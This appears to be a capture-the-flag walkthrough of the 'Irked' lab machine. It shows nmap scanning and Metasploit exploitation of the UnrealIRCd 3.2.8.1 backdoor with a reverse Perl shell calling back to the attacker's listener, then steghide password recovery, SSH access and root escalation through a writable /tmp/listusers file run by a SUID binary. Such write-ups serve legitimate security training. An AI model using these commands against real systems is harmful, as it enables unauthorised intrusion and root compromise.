I run nmap on the victim IP and find 7 different ips running on the server. Several of which are running IRC, specifically Unreal IRCD.

```
nmap -p- -sC -sV {victim ip}
```

There is an exploit available in Unreal IRCD 3.2.8.1, CVE-2010-2075, which contains an externally introduced modification, which allows remote attackers to execute commands.

Using metasploit, I search for this CVE, and find one good exploit. After setting necessary options I find I am unable to run the exploit. The reason I was unable to run the exploit is I did not set a *payload*. 

```
$ msfconsole

...

[msf](Jobs:0 Agents:0) >> search CVE-2010-2075

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution

[msf](Jobs:0 Agents:0) >> use 0
[msf](Jobs:0 Agents:0) exploit(unix/irc/unreal_ircd_3281_backdoor) >> options

Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    6667             yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(unix/irc/unreal_ircd_3281_backdoor) >> set RPORT 8067
RPORT => 8067
[msf](Jobs:0 Agents:0) exploit(unix/irc/unreal_ircd_3281_backdoor) >> set RHOSTS 10.129.125.75
RHOSTS => 10.129.125.75
[msf](Jobs:0 Agents:0) exploit(unix/irc/unreal_ircd_3281_backdoor) >> exploit

[-] 10.129.125.75:8067 - Exploit failed: A payload has not been selected.
[*] Exploit completed, but no session was created.
[msf](Jobs:0 Agents:0) exploit(unix/irc/unreal_ircd_3281_backdoor) >> set RPORT 6697
RPORT => 6697
[msf](Jobs:0 Agents:0) exploit(unix/irc/unreal_ircd_3281_backdoor) >> exploit

[-] 10.129.125.75:6697 - Exploit failed: A payload has not been selected.
[*] Exploit completed, but no session was created.
```

Admittedly, I was not able to run this exploit and spun my wheels for a while. If I get the error:

```
[*] Exploit completed, but no session was created.
```

I should consider setting a payload that will callback to my listening server. 

*Important to follow steps*

While in my chosen exploit I `show payloads` then `set payload x`, which links my chosen exploit with my chosen payload. After setting the payload, `options` to set payload options. Finally, I run exploit:

```
[msf](Jobs:0 Agents:0) exploit(unix/irc/unreal_ircd_3281_backdoor) >> set payload cmd/unix/reverse_perl
payload => cmd/unix/reverse_perl
[msf](Jobs:0 Agents:0) exploit(unix/irc/unreal_ircd_3281_backdoor) >> options

Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.129.125.75    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   65534            yes       The target port (TCP)


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.207     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(unix/irc/unreal_ircd_3281_backdoor) >> exploit

[*] Started reverse TCP handler on 10.10.14.207:4444 
[*] 10.129.125.75:65534 - Connected to 10.129.125.75:65534...
    :irked.htb NOTICE AUTH :*** Looking up your hostname...
[*] 10.129.125.75:65534 - Sending backdoor command...
[*] Command shell session 1 opened (10.10.14.207:4444 -> 10.129.125.75:46754) at 2024-10-21 17:26:42 -0500

python3 -c 'import pty;pty.spawn("/bin/bash")'
ircd@irked:~/Unreal3.2$ ls -la
```

Setting the payload and running `exploit`, gets a local shell on the target's box.

#### Lateral Movement

A file called `.backup` is found

```
ircd@irked:/home/djmardov/Documents$ cat .backup
cat .backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

I download the file and use `steghide` to extract.

```
wget http://10.10.10.117/irked.jpg
steghide extract -p UPupDOWNdownLRlrBAbaSSss -sf irked.jpg
```

This is written to pass.txt, and I cat the file to get `djmardov`'s password.

To get a shell on `djmardov`, use ssh and the pw:

```
ssh djmardov@{victim ip}
```
I find a file `/usr/bin/viewuser`, that is accessible and executable by root. When executing it, it runs a file `/tmp/listusers`.

I download the file locally:

```
$ scp djmardov@10.10.10.117:/usr/bin/viewuser viewuser
$ ltrace ./viewuser
```

I exploit this by creating the file `/tmp/listusers` and have it execute a shell, which is of course owned by root.

```
$ echo​ ​'/bin/sh'​ > /tmp/listusers 
$ chmod a+x /tmp/listusers 
$ /usr/bin/viewuser
# whoami
uid=0(root) ...

# cat /root/root.txt
1ab8903b9fb16ff9d51e2434e16789b7
```









